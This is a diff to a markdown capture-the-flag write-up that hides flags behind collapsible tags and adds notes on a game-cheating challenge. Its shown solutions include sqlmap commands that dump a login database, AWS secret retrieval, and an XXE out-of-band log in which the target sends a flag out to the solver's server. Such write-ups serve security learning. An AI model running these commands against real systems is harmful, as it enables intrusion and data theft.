@@ -70,7 +70,10 @@ Our first challenge is to decrypt that string. We see the string is base64 encod
 
 `echo RkxBR3tMb29rc19yZWFsbHlfY3J5cHRpY19idXRfaXNfZWFzaWx5X3JldmVyc2VkfQ== | base64 -d`
 
+<details>
+  <summary>FLAG</summary>
 FLAG{Looks_really_cryptic_but_is_easily_reversed}
+</details>
 
 ### 2.2 Basic Ciphers
 
@@ -89,7 +92,10 @@ Lets pop that terminal open again and use this little script that rotates the al
 echo SYNT{jryy_guvf_jnf_rnfl} | tr '[a-m][n-z][A-M][N-Z]' '[n-z][a-m][N-Z][A-M]'
 ```
 
+<details>
+  <summary>FLAG</summary>
 FLAG{well_this_was_easy}
+</details>
 
 ### 2.3 I want to see more, see more and see more
 
@@ -115,7 +121,10 @@ $ echo 1101 1011 10 001 000111 110010 0111 1 1 1001 110010 0111 000 000 1001 110
 
 Now we need to change that Morse code into something we can read so we fireup [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')) and we load our morse code in there and vóila we got a flag.
 
-FLAG:_BEEP_BOOP_BEEP_BEEP_BOOP_MULTIPLE_LAYERS_ON_TOP_OF_EACH_OTHER
+<details>
+  <summary>FLAG</summary>
+  FLAG:_BEEP_BOOP_BEEP_BEEP_BOOP_MULTIPLE_LAYERS_ON_TOP_OF_EACH_OTHER
+</details>
 
 ## 3. OSINT
 
@@ -140,7 +149,11 @@ We get a picture from some random location. Ok, let's see what the hints give us
  2. The castle in the picture is called Castelo de San Jorge.
  3. It's not the bigger street, it's the even smaller alley.
 
-Let's try [google reverse image search](https://www.google.com/imghp?hl=EN). No results. Okay no worries, let's try [Tineye](https://tineye.com/). No results. Let's take on [Google maps](https://google.com/maps) and search for Castelo de San Jorge, lets turn on satellite imaging so we can actually see some buildings and lets roll into 3D mode and try to place ourselves on the exact same position as where the picture was taken. Now [this](https://www.google.com/maps/place/Castelo+de+S.+Jorge/@38.7194273,-9.1346289,38a,35y,178.13h,79.21t/data=!3m1!1e3!4m5!3m4!1s0xd193477b40ec39b:0xb4c0704199e433d7!8m2!3d38.7139092!4d-9.1334762) looks familiar. Little fidgeting and we have the correct street address: Escadinhas das Olarias
+Let's try [google reverse image search](https://www.google.com/imghp?hl=EN). No results. Okay no worries, let's try [Tineye](https://tineye.com/). No results. Let's take on [Google maps](https://google.com/maps) and search for Castelo de San Jorge, lets turn on satellite imaging so we can actually see some buildings and lets roll into 3D mode and try to place ourselves on the exact same position as where the picture was taken. Now [this](https://www.google.com/maps/place/Castelo+de+S.+Jorge/@38.7194273,-9.1346289,38a,35y,178.13h,79.21t/data=!3m1!1e3!4m5!3m4!1s0xd193477b40ec39b:0xb4c0704199e433d7!8m2!3d38.7139092!4d-9.1334762) looks familiar. Little fidgeting and we have the correct street address: 
+<details>
+  <summary>FLAG</summary>
+  Escadinhas das Olarias
+</details>
 
 ### 3.3 OSINT: Social Media 1
 
@@ -315,8 +328,12 @@ Thou shall not pass?
  Kissa123
 Thy password: Kissa123
 Thy answer has been accepted! Here is the wisdom for thy benefit.
-FLAG{ROTWasHere2021}
 ```
+
+<details>
+  <summary>FLAG</summary>
+FLAG{ROTWasHere2021}
+</details>
 
 ### 4.2 Deep inside ones and zeros
 
@@ -371,9 +388,14 @@ Thou shall not pass?
  ThknsfUrkbt
 Thy password: ThknsfUrkbt
 Thy answer has been accepted! Here is the wisdom for thy benefit.
-FLAG{DecompileLikeAPro}
+<flag>
 Psst. Solita is recruiting, wink wink ;-)
 ```
+
+<details>
+  <summary>FLAG</summary>
+  FLAG{DecompileLikeAPro}
+</details>
 
 ## 5. Steganography
 
@@ -554,8 +576,13 @@ Lets rename the file into .png and open it up
 $ mv decrypted_data decrypted_data.png
 ```
 
-![decrypted_data](./crypto/crypto1/decrypted_data.png)
-
+<details>
+  <summary>FLAG</summary>
+  
+  ![decrypted_data](./crypto/crypto1/decrypted_data.png)
+  
+</details>
+  
 ### 6.2 Catch the criminal 2
 
 ```
@@ -733,8 +760,14 @@ $ mv decrypted_data decrypted_data.png
 ```
 
 And there we go we got the flag!
-![crypto2](./crypto/crypto2/crypto2.png)
 
+<details>
+  <summary>FLAG</summary>
+  
+  ![crypto2](./crypto/crypto2/crypto2.png)
+  
+</details>
+  
 P.S this can also be done with [CyberChef](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Hex','string':'55aa332211449988eeff66cc2277aa55'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'55'%7D,'Standard',false)XOR(%7B'option':'Hex','string':'aa'%7D,'Standard',false)) the link provides 3 xor rounds first one with the entire 16byte key `55aa332211449988eeff66cc2277aa55` and 2 others 2nd with key `55` and 3rd with key `aa`, just input the encrypted_data and download the file and name it download.png
 
 ## 7. Cheating
@@ -840,8 +873,13 @@ Line: 137                        )
 
 Now the client doesn't do a check if we have more than 0 ammo and should let us shoot infinitely. Save the file and lets try it out. Launch the client again `python3 client.py` and start shooting. Yes it works! but we didn't get achievement because we're not in the correct server, lets change that. Lets comment `line 113` and uncomment the `line 114` now we can connect to the CTF hosted challenge server. Fire up the client again and go shooting.
 
-![pewpew](./cheating/pewpew.png)
+<details>
+  <summary>FLAG</summary>
+  
+  ![pewpew](./cheating/pewpew.png)
 
+</details>
+  
 ### 7.2 Project Kyyber 2021 part 2
 
 ```
@@ -895,7 +933,12 @@ Back in the `client.py` change we add a new sendevent in our jump function like 
 
 That should do it, lets try it!
 
-![noroof](./cheating/noroof.png)
+<details>
+  <summary>FLAG</summary>
+  
+  ![noroof](./cheating/noroof.png)
+  
+</details>
 
 SUCCESS!
 
@@ -909,8 +952,27 @@ Alrighty then time to get those bigboy pants and see what we're up against. Lets
 
 ![bossfound](./cheating/bossfound.png)
 
-Boss was found and when we landed we got killed pretty much instantly. Hmmmm, how do we proceed from this?
-Well first off we might want to shoot automatically so we dont need to click all the time. Lets do that first.
+Boss was found and when we landed we got killed pretty much instantly. Hmmmm, how do we proceed from this? The boss seems to have some sort of Forcefield and after going to the boss again and trying to shoot it nothing seems to hit the boss. Let's check out the source once more and see whats going on.
+
+```py
+216                         for boss in gamestate.bosses:
+217                             if distance(projectile, boss) < 10:
+218                                 boss.hp -= 1
+219                                 gamestate.projectiles.remove(projectile)
+220                                 break
+221                             # Forcefield
+222                             if (
+223                                 distance(projectile, boss)
+224                                 < boss.hitbox / 2 + projectile.hitbox / 2
+225                             ):
+226                                 gamestate.projectiles.remove(projectile)
+227                                 break
+```
+
+Thats under `common.py` physics function. This line `distance(projectile, boss) < boss.hitbox / 2 + projectile.hitbox / 2` creates the forcefield around the boss.
+We can see from `objects.py` that the `boss.hitbox` is 90 and `projectile.hitbox` is 30 and doing some simple math 90/2=45 + 30/2=15 = 60. So everything in the range of 10-60 from the boss gets removed. So basically this means we need to be withing 10(pixels?) of the boss to actually be able to hit him. Alright now we know what to do so let's start!
+
+First off we might want to shoot automatically so we dont need to click all the time. Lets do that first.
 
 We copy lines lines 130-137 to under `if me: on line 123`. We do this because `if me:` doesnt have any type of event checks unlike the original position. Now it just shoots if player exists.
 
@@ -1013,8 +1075,13 @@ Line 131:                    sendevent.append(["left"])
 
 Now they will follow us around and shoot continuously. You can adjust where they shoot with your mouse once you start the botclient. To start the botclient you use `python3 botclient.py 18350961928273032797` for example. The master_id will be printed in our `client.py` start console.
 Now lets create some botclients and go kill that boss! Aaaaand its done!
-![bosskiller](./cheating/bosskiller.png)
 
+<details>
+  <summary>FLAG</summary>
+  
+  ![bosskiller](./cheating/bosskiller.png)
+  
+</details>
 ## 8. Cloud
 
 ### 8.1 AWS Challenge 1
@@ -1149,11 +1216,16 @@ Still remember our hint for the challenge? Thats a S3 Bucket address. Lets take 
 
 Looks like we found ourselves a flag!
 
-```bash
-$ curl https://frk-bucket-challenge-1234.s3.amazonaws.com/settings/stuff/flag.txt
-FLAG{jAnu6QLYjcmotXMUCmxfjW1Td3z6HD74EMTPuYHvdjtY3Dfyy8TUF7NFatasb1}
-```
+<details>
+  <summary>FLAG</summary>
 
+  ```bash
+  $ curl https://frk-bucket-challenge-1234.s3.amazonaws.com/settings/stuff/flag.txt
+  FLAG{jAnu6QLYjcmotXMUCmxfjW1Td3z6HD74EMTPuYHvdjtY3Dfyy8TUF7NFatasb1}
+  ```
+
+</details>
+  
 ### 8.2 AWS Challenge 2
 
 ```
@@ -1243,10 +1315,17 @@ drwxr-xr-x  4    0    0   4096 Mar 10 14:09 ..
 -rw-r--r--  1 1001 1002   3771 Mar 10 14:09 .bashrc
 -rw-r--r--  1 1001 1002    807 Mar 10 14:09 .profile
 -r--r-----+ 1 1001 1001     62 Mar 10 14:45 .secret
-
-$ cat .secret
-FLAG{2ChyDuRe7CyFLLHC6mC18KpCwVt7wEiKzD2gZa0ePLka3GJiP2chHtg}
 ```
+
+<details>
+  <summary>FLAG</summary>
+  
+  ```bash
+  $ cat .secret
+  FLAG{2ChyDuRe7CyFLLHC6mC18KpCwVt7wEiKzD2gZa0ePLka3GJiP2chHtg}
+  ```
+  
+</details>
 
 Got it!
 
@@ -1310,49 +1389,55 @@ drwxr-xr-x 4    0    0 4096 Mar 10 14:09 ..
 -rw-r--r-- 1 1002 1003  220 Mar 10 14:09 .bash_logout
 -rw-r--r-- 1 1002 1003 3771 Mar 10 14:09 .bashrc
 -rw-r--r-- 1 1002 1003  807 Mar 10 14:09 .profile
-
-Nothing interesting in .bashrc or .profile. What about .bash_history?
-$ cat .bash_history
-cd /home/joe/
-cd $HOME
-ls
-ls al
-ls
-ls -al
-cat .secret
-sudo -i
-ls
-ssh-keygen -t ed25519
-ssh-keygen -t ed25519 -C "secret@example.com"
-cat ~/.ssh/id_ed25519.pub
-cat ~/.ssh/id_ed25519
-rm ~/.ssh/id_ed25519*
-echo "ok"
-tail test
-tail test
-tail test
-tail test
-tail test
-....
-tail test
-tail test
-tail test
-echo "FLAG{1mPomoMgTwPi7d6cjmay4ehHHmR7djFpc4zJDDgquBbFpx8UMHGUFh9NDJa6}"
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-tail test
-....
-tail test
-touch Test1
-touch Test3
-touch Test2
 ```
+Nothing interesting in .bashrc or .profile. What about .bash_history?
 
+<details>
+  <summary>FLAG</summary>
+
+  ```bash
+  $ cat .bash_history
+  cd /home/joe/
+  cd $HOME
+  ls
+  ls al
+  ls
+  ls -al
+  cat .secret
+  sudo -i
+  ls
+  ssh-keygen -t ed25519
+  ssh-keygen -t ed25519 -C "secret@example.com"
+  cat ~/.ssh/id_ed25519.pub
+  cat ~/.ssh/id_ed25519
+  rm ~/.ssh/id_ed25519*
+  echo "ok"
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  ....
+  tail test
+  tail test
+  tail test
+  echo "FLAG{1mPomoMgTwPi7d6cjmay4ehHHmR7djFpc4zJDDgquBbFpx8UMHGUFh9NDJa6}"
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  tail test
+  ....
+  tail test
+  touch Test1
+  touch Test3
+  touch Test2
+  ```
+  
+</details>
 We got ourselves a flag!
 
 ### 8.4 AWS Challenge 4
@@ -1485,20 +1570,25 @@ $ aws secretsmanager list-secrets --region=eu-west-1
 
 Okay so there is a secret, now can use `aws secretsmanager get-secret-value --secret-id=fisc-chall-secret --region=eu-west-1`
 
-```bash
-$ aws secretsmanager get-secret-value --secret-id=fisc-chall-secret --region=eu-west-1
-{
-    "ARN": "arn:aws:secretsmanager:eu-west-1:037476587073:secret:fisc-chall-secret-41VJbh",
-    "Name": "fisc-chall-secret",
-    "VersionId": "56910c2e-18a7-4b62-892a-09f112ebc48e",
-    "SecretString": "{\"ChallengeSecret\":\"FLAG{not_too_secret}\"}",
-    "VersionStages": [
-        "AWSCURRENT"
-    ],
-    "CreatedDate": 1615376736.686
-}
-```
+<details
+  <summary>FLAG</summary>
 
+  ```bash
+  $ aws secretsmanager get-secret-value --secret-id=fisc-chall-secret --region=eu-west-1
+  {
+      "ARN": "arn:aws:secretsmanager:eu-west-1:037476587073:secret:fisc-chall-secret-41VJbh",
+      "Name": "fisc-chall-secret",
+      "VersionId": "56910c2e-18a7-4b62-892a-09f112ebc48e",
+      "SecretString": "{\"ChallengeSecret\":\"FLAG{not_too_secret}\"}",
+      "VersionStages": [
+          "AWSCURRENT"
+      ],
+      "CreatedDate": 1615376736.686
+  }
+  ```
+
+</details>
+         
 Flag extracted!
 
 ## 9. Web
@@ -1600,7 +1690,13 @@ Seems like it works! Lets use our trusted program from SQL Injections called [sq
 Lets run this `sqlmap -u https://hacklogin.challenge.fi/password-recovery.php --data "username=admin" --threads 10 --batch -dbs`
 ![dbfound](./web/dbfound.png)
 Next lets add the database into our line and lets dump all data that the database has. `sqlmap -u https://hacklogin.challenge.fi/password-recovery.php --data "username=admin" --threads 10 --batch -D random --dump-all`
-![dumpall](./web/dumpall.png)
+
+<details>
+  <summary>FLAG</summary>
+
+  ![dumpall](./web/dumpall.png)
+  
+</details>
 
 We got the hash and it works as a flag!
 
@@ -1634,7 +1730,12 @@ Dictionary cache built:
 
 Now we can login with admin:chess
 
-![isnice](./web/isnice.png)
+<details>
+  <summary>FLAG</summary>
+
+  ![isnice](./web/isnice.png)
+
+</details>
 
 BORAT SAYZ IZ NICE!
 
@@ -1685,7 +1786,12 @@ Seems to be working. No we can try to extract the file from the server using `fi
 Hmmm doesn't seem to be working right off the bat. Should we try exporting to PDF? could that be the trick. Lets try it.
 We write `/pdf` in our [url](https://hack-md.challenge.fi/Ty_qf4mCRImlxSOzzY2FTg/pdf) and download the PDF file.
 
-![flagfound](./web/flagfound.png)
+<details>
+  <summary>FLAG</summary>
+
+  ![flagfound](./web/flagfound.png)
+  
+</details>
 
 ### 9.5 Aapoweb
 
@@ -1766,90 +1872,94 @@ Email Address []:
 ```
 
 Now we're done with that lets connect with openssl again using our new privatekey and certificate.
+<details>
+  <summary>FLAG</summary>
 
-```bash
-$ openssl s_client -connect aapoweb.challenge.fi:8008 -cert aapoweb.crt -key aapoweb.key 
-CONNECTED(00000003)
-depth=0 C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
-verify error:num=18:self signed certificate
-verify return:1
-depth=0 C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
-verify return:1
----
-Certificate chain
- 0 s:C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
-   i:C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
----
-Server certificate
------BEGIN CERTIFICATE-----
-MIIDmzCCAoOgAwIBAgIUUrMinl868JuEquTowIDoy4Uz/yYwDQYJKoZIhvcNAQEL
-BQAwUzELMAkGA1UEBhMCRkkxEDAOBgNVBAgMB1V1c2ltYWExDjAMBgNVBAcMBUVz
-cG9vMRAwDgYDVQQKDAdhYXBvd2ViMRAwDgYDVQQDDAdhYXBvd2ViMB4XDTIxMDMx
-MjEzMTYxMloXDTIyMDMxMjEzMTYxMlowUzELMAkGA1UEBhMCRkkxEDAOBgNVBAgM
-B1V1c2ltYWExDjAMBgNVBAcMBUVzcG9vMRAwDgYDVQQKDAdhYXBvd2ViMRAwDgYD
-VQQDDAdhYXBvd2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAznZK
-40mM1AFlMeqtlOdVMkAMZrSLVYi00DoaWpd0VPjI6vU9kYoI6MZGdkOR84MgUXIz
-G9dFGYAobm73lQr2wprmkSl/w0eeHoovMhOZXWSmGuZh+k5H4UzCaxmVpdE6yYHQ
-2u719OPkwSTGVFsfahB3+6J0QaGAPnF6vSTbNv7bpyGjm9b60BgVKNw1GXBnEAlZ
-dTS/fyEiSlB5DS7R/UpmlU3IWB008DRd32qajckIF393oupKIMqRjOyIXdxf0YdD
-BG8x6uWVk4VUG4OmTjM/8MfxKQbgsyRgiYKAh2neSvjBSbRCGiQfhYNxgzsCqWsS
-lSUbg/aVJA0OCPfuzwIDAQABo2cwZTAdBgNVHQ4EFgQUQ79jho5vUOmQfk0UckTN
-HedViD0wHwYDVR0jBBgwFoAUQ79jho5vUOmQfk0UckTNHedViD0wDwYDVR0TAQH/
-BAUwAwEB/zASBgNVHREECzAJggdhYXBvd2ViMA0GCSqGSIb3DQEBCwUAA4IBAQCq
-XnouhbgPNXqgVso7EwtfZ7gf/cRijA1NBw7NQ7tfbRjZrli0ykdOHOak4EZRLHrm
-HRlFDm9KyOuE/orTNkB6qch50b+CYedrwKSrfycHJjN8fC8cJnty7aHQvM3NGqg4
-bqPvfcVJB8j54aNFiZIN1hTCLKlgSBXSrhskHQGYovVyx+WICooAN+JZzNZv/qtn
-d3CerCEsdXabEKEyPH9+ZkRu66veDFQbgAYSWaoL9gGGYj0nCM2RFINRv1LLl+t1
-YW6g003lagllF8Iw2qrYBIqgVbqmzeJPtd6Xz4W6XA2kF1j27EbocUrU0xu0eo8n
-O6Z9KgPS0pMnc2nuZG8U
------END CERTIFICATE-----
-subject=C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  ```bash
+  $ openssl s_client -connect aapoweb.challenge.fi:8008 -cert aapoweb.crt -key aapoweb.key 
+  CONNECTED(00000003)
+  depth=0 C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  verify error:num=18:self signed certificate
+  verify return:1
+  depth=0 C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  verify return:1
+  ---
+  Certificate chain
+   0 s:C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+     i:C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  ---
+  Server certificate
+  -----BEGIN CERTIFICATE-----
+  MIIDmzCCAoOgAwIBAgIUUrMinl868JuEquTowIDoy4Uz/yYwDQYJKoZIhvcNAQEL
+  BQAwUzELMAkGA1UEBhMCRkkxEDAOBgNVBAgMB1V1c2ltYWExDjAMBgNVBAcMBUVz
+  cG9vMRAwDgYDVQQKDAdhYXBvd2ViMRAwDgYDVQQDDAdhYXBvd2ViMB4XDTIxMDMx
+  MjEzMTYxMloXDTIyMDMxMjEzMTYxMlowUzELMAkGA1UEBhMCRkkxEDAOBgNVBAgM
+  B1V1c2ltYWExDjAMBgNVBAcMBUVzcG9vMRAwDgYDVQQKDAdhYXBvd2ViMRAwDgYD
+  VQQDDAdhYXBvd2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAznZK
+  40mM1AFlMeqtlOdVMkAMZrSLVYi00DoaWpd0VPjI6vU9kYoI6MZGdkOR84MgUXIz
+  G9dFGYAobm73lQr2wprmkSl/w0eeHoovMhOZXWSmGuZh+k5H4UzCaxmVpdE6yYHQ
+  2u719OPkwSTGVFsfahB3+6J0QaGAPnF6vSTbNv7bpyGjm9b60BgVKNw1GXBnEAlZ
+  dTS/fyEiSlB5DS7R/UpmlU3IWB008DRd32qajckIF393oupKIMqRjOyIXdxf0YdD
+  BG8x6uWVk4VUG4OmTjM/8MfxKQbgsyRgiYKAh2neSvjBSbRCGiQfhYNxgzsCqWsS
+  lSUbg/aVJA0OCPfuzwIDAQABo2cwZTAdBgNVHQ4EFgQUQ79jho5vUOmQfk0UckTN
+  HedViD0wHwYDVR0jBBgwFoAUQ79jho5vUOmQfk0UckTNHedViD0wDwYDVR0TAQH/
+  BAUwAwEB/zASBgNVHREECzAJggdhYXBvd2ViMA0GCSqGSIb3DQEBCwUAA4IBAQCq
+  XnouhbgPNXqgVso7EwtfZ7gf/cRijA1NBw7NQ7tfbRjZrli0ykdOHOak4EZRLHrm
+  HRlFDm9KyOuE/orTNkB6qch50b+CYedrwKSrfycHJjN8fC8cJnty7aHQvM3NGqg4
+  bqPvfcVJB8j54aNFiZIN1hTCLKlgSBXSrhskHQGYovVyx+WICooAN+JZzNZv/qtn
+  d3CerCEsdXabEKEyPH9+ZkRu66veDFQbgAYSWaoL9gGGYj0nCM2RFINRv1LLl+t1
+  YW6g003lagllF8Iw2qrYBIqgVbqmzeJPtd6Xz4W6XA2kF1j27EbocUrU0xu0eo8n
+  O6Z9KgPS0pMnc2nuZG8U
+  -----END CERTIFICATE-----
+  subject=C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
 
-issuer=C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
+  issuer=C = FI, ST = Uusimaa, L = Espoo, O = aapoweb, CN = aapoweb
 
----
-No client certificate CA names sent
-Client Certificate Types: RSA sign
-Requested Signature Algorithms: RSA-PSS+SHA512:RSA-PSS+SHA384:RSA-PSS+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA256:RSA+SHA224:RSA+SHA1
-Shared Requested Signature Algorithms: RSA-PSS+SHA512:RSA-PSS+SHA384:RSA-PSS+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA256:RSA+SHA224
-Peer signing digest: SHA512
-Peer signature type: RSA-PSS
-Server Temp Key: X25519, 253 bits
----
-SSL handshake has read 1394 bytes and written 1588 bytes
-Verification error: self signed certificate
----
-New, TLSv1.2, Cipher is ECDHE-RSA-CHACHA20-POLY1305
-Server public key is 2048 bit
-Secure Renegotiation IS supported
-Compression: NONE
-Expansion: NONE
-No ALPN negotiated
-SSL-Session:
-    Protocol  : TLSv1.2
-    Cipher    : ECDHE-RSA-CHACHA20-POLY1305
-    Session-ID: 
-    Session-ID-ctx: 
-    Master-Key: 3B651BB1D3F2A2AC993B96A65EA8F3D66CEA61F866FD21AB050BCCC80F060483ECAA4503BE41B46B8DA4FB9A7FDB2C5B
-    PSK identity: None
-    PSK identity hint: None
-    SRP username: None
-    Start Time: 1617265707
-    Timeout   : 7200 (sec)
-    Verify return code: 18 (self signed certificate)
-    Extended master secret: yes
----
+  ---
+  No client certificate CA names sent
+  Client Certificate Types: RSA sign
+  Requested Signature Algorithms: RSA-PSS+SHA512:RSA-PSS+SHA384:RSA-PSS+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA256:RSA+SHA224:RSA+SHA1
+  Shared Requested Signature Algorithms: RSA-PSS+SHA512:RSA-PSS+SHA384:RSA-PSS+SHA256:RSA+SHA512:RSA+SHA384:RSA+SHA256:RSA+SHA224
+  Peer signing digest: SHA512
+  Peer signature type: RSA-PSS
+  Server Temp Key: X25519, 253 bits
+  ---
+  SSL handshake has read 1394 bytes and written 1588 bytes
+  Verification error: self signed certificate
+  ---
+  New, TLSv1.2, Cipher is ECDHE-RSA-CHACHA20-POLY1305
+  Server public key is 2048 bit
+  Secure Renegotiation IS supported
+  Compression: NONE
+  Expansion: NONE
+  No ALPN negotiated
+  SSL-Session:
+      Protocol  : TLSv1.2
+      Cipher    : ECDHE-RSA-CHACHA20-POLY1305
+      Session-ID: 
+      Session-ID-ctx: 
+      Master-Key: 3B651BB1D3F2A2AC993B96A65EA8F3D66CEA61F866FD21AB050BCCC80F060483ECAA4503BE41B46B8DA4FB9A7FDB2C5B
+      PSK identity: None
+      PSK identity hint: None
+      SRP username: None
+      Start Time: 1617265707
+      Timeout   : 7200 (sec)
+      Verify return code: 18 (self signed certificate)
+      Extended master secret: yes
+  ---
 
-HTTP/1.1 200 OK
-Content-Length: 72
+  HTTP/1.1 200 OK
+  Content-Length: 72
 
-<html>
-<body>
-<h1>NIXU{you_are_now_offically_aapo}</h1>
-</body>
-</html>
-closed
-```
+  <html>
+  <body>
+  <h1>NIXU{you_are_now_offically_aapo}</h1>
+  </body>
+  </html>
+  closed
+  ```
+  
+</details>
 
 There we go!
 
@@ -1978,17 +2088,22 @@ Username or password not found! Try Harder!
 
 I thought "nononono not this again...." but then I checked my xxeserv and FINALLY I got a response from the server!
 
-```bash
-$ ./xxeserv -w -wp 21
-2021/04/01 10:19:50 [*] Starting Web Server on 21 [./]
-[*] Found certificate files in directory. Using these.
-2021/04/01 10:19:50 [*] GO XXE FTP Server - Port:  2121
-[*] UNO Listening...
-2021/04/01 10:20:01 [13.49.220.72:49414][200] /dtds/sp2.dtd
-2021/04/01 10:20:01 [13.49.220.72:49416][404] /ZmxhZ3tUMzRtX1IwVF9XNHNfSDNyRSF9Cg==
+<details>
+  <summary>FLAG</summary>
 
-$ echo ZmxhZ3tUMzRtX1IwVF9XNHNfSDNyRSF9Cg== |base64 -d
-flag{T34m_R0T_W4s_H3rE!}
-```
+  ```bash
+  $ ./xxeserv -w -wp 21
+  2021/04/01 10:19:50 [*] Starting Web Server on 21 [./]
+  [*] Found certificate files in directory. Using these.
+  2021/04/01 10:19:50 [*] GO XXE FTP Server - Port:  2121
+  [*] UNO Listening...
+  2021/04/01 10:20:01 [13.49.220.72:49414][200] /dtds/sp2.dtd
+  2021/04/01 10:20:01 [13.49.220.72:49416][404] /ZmxhZ3tUMzRtX1IwVF9XNHNfSDNyRSF9Cg==
+
+  $ echo ZmxhZ3tUMzRtX1IwVF9XNHNfSDNyRSF9Cg== |base64 -d
+  flag{T34m_R0T_W4s_H3rE!}
+  ```
+
+</details>
 
 Success! CTF Complete, it took me a few days but the feeling was worth it. Hope you learned something from this, see you on the next write-up!
